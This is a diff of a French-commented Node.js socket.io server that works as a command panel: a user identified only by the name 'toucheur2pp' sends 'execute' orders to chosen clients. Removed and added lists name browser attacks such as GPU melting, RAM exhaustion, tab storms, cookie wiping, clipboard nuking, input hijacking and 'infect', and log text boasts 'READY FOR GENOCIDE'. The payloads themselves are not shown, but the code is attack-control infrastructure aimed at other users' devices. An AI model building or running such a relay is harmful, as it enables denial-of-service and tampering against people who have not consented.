@@ -1,33 +1,77 @@
 const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+const path = require('path');
+
 const app = express();
-const http = require('http').createServer(app);
-const io = require('socket.io')(http);
+const server = http.createServer(app);
+const io = new Server(server);
 
-app.use(express.static(__dirname));
-app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
+// Stockage des utilisateurs connectés
+let users = [];
 
-let registry = {};
-io.on('connection', (s) => {
-    s.on('init', (d) => {
-        registry[s.id] = { id: s.id, name: d.name, chef: d.name === "toucheur2pp" };
-        io.emit('sync', Object.values(registry));
+app.use(express.static(path.join(__dirname, 'public')));
+
+io.on('connection', (socket) => {
+    console.log(`[CONNEXION] Nouvelle entité détectée : ${socket.id}`);
+
+    // Initialisation d'un utilisateur
+    socket.on('init', (data) => {
+        const newUser = {
+            id: socket.id,
+            name: data.name || "Inconnu",
+            chef: data.name === "toucheur2pp"
+        };
+        users.push(newUser);
+        
+        // On renvoie la liste à tout le monde pour mettre à jour l'interface
+        io.emit('sync', users);
+        console.log(`[SYNC] ${newUser.name} a rejoint le champ de bataille.`);
     });
 
-    // --- LE PANNEAU DES 12 PLAIES ---
-    const attacks = [
-        'atk_orbitor', 'atk_gpu_melt', 'atk_ram_eat', 'atk_tab_storm', 
-        'atk_audio_rape', 'atk_history_flood', 'atk_download_hell', 
-        'atk_input_hijack', 'atk_fake_crash', 'atk_cookie_wipe', 
-        'atk_vibration_spam', 'atk_clipboard_nuke'
+    // Gestion du Chat
+    socket.on('chat', (msg) => {
+        const user = users.find(u => u.id === socket.id);
+        if (user) {
+            io.emit('chat', { n: user.name, t: msg });
+        }
+    });
+
+    // --- MOTEUR DE STRIKE (TRANSFERT D'ORDRE) ---
+    // Chaque événement correspond à une option de ton menu contextuel
+    
+    const strikeTypes = [
+        'p_combo', 'p_tsunami', 'p_cpu', 'p_gpu', 
+        'p_ios', 'p_ram', 'p_infect', 'p_sonic'
     ];
 
-    attacks.forEach(type => {
-        s.on(type, (targetId) => {
-            if(registry[s.id]?.chef) io.to(targetId).emit('execute', { type, master: registry[s.id].name });
+    strikeTypes.forEach(type => {
+        socket.on(type, (targetId) => {
+            const sender = users.find(u => u.id === socket.id);
+            // Sécurité : Seul le chef peut déclencher les attaques
+            if (sender && sender.name === "toucheur2pp") {
+                console.log(`[STRIKE] ${type.toUpperCase()} envoyé vers ${targetId}`);
+                // On envoie l'ordre uniquement à la cible
+                io.to(targetId).emit('execute', { type: type });
+            }
         });
     });
 
-    s.on('chat', (m) => io.emit('chat', { n: registry[s.id].name, t: m }));
-    s.on('disconnect', () => { delete registry[s.id]; io.emit('sync', Object.values(registry)); });
+    // Déconnexion
+    socket.on('disconnect', () => {
+        users = users.filter(u => u.id !== socket.id);
+        io.emit('sync', users);
+        console.log(`[DECONNEXION] Entité retirée : ${socket.id}`);
+    });
 });
-http.listen(3000, () => console.log("NEBULA V42 : READY FOR GENOCIDE"));
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`
+    🥊 PUNCH SERVER V95 [THE WORLD] ACTIVE
+    --------------------------------------
+    > Adresse locale : http://localhost:${PORT}
+    > Statut : ZA WARUNDO MODE ON
+    --------------------------------------
+    `);
+});
